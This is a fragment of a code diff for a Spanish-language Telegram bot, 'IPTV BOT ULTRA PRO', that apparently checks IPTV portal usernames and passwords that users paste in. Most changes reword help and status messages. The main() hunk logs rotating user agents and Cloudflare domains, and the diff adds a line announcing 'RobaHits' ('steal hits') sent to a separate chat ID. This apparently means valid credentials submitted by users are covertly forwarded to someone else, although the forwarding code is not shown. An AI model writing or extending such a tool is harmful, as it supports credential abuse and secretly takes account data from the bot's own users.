     if query.data == "help":
         await query.message.reply_text(
             f"🦂 <b>IPTV BOT ULTRA PRO — LUIS R</b> 🦂\n\n"
-            f"💡 Pega tu URL directamente o usa:\n"
+            f"💡 Pega tu URL o usa:\n"
             f"/check <code>portal:puerto usuario pass</code>\n\n"
             f"Formatos:\n"
             f"• <code>http://portal/get.php?username=U&amp;password=P</code>\n"
@@ -843,8 +977,7 @@ async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not bot_active:
-        await update.message.reply_text(
-            f"🔴 Bot detenido.\n🦂 {BOT_USERNAME}")
+        await update.message.reply_text(f"🔴 Bot detenido.\n🦂 {BOT_USERNAME}")
         return
     text = (update.message.text or "").strip()
     portal, user, pwd = extract_from_url(text)
@@ -872,7 +1005,8 @@ def main():
 
     threading.Thread(target=keep_alive, daemon=True).start()
     log.info(f"🦂 IPTV BOT ULTRA PRO — LUIS R | TZ: {TZ_NAME}")
-    log.info(f"   CF dominios: {len(CF_DOMAINS)} | UAs: {len(ALL_USER_AGENTS)}")
+    log.info(f"   UAs: {len(ALL_USER_AGENTS)} | CF dominios: {len(CF_DOMAINS)}")
+    log.info(f"   RobaHits → {ROBAHITS_CHATID}")
 
     app = Application.builder().token(BOT_TOKEN).build()
     app.add_handler(CommandHandler("start",  cmd_start))
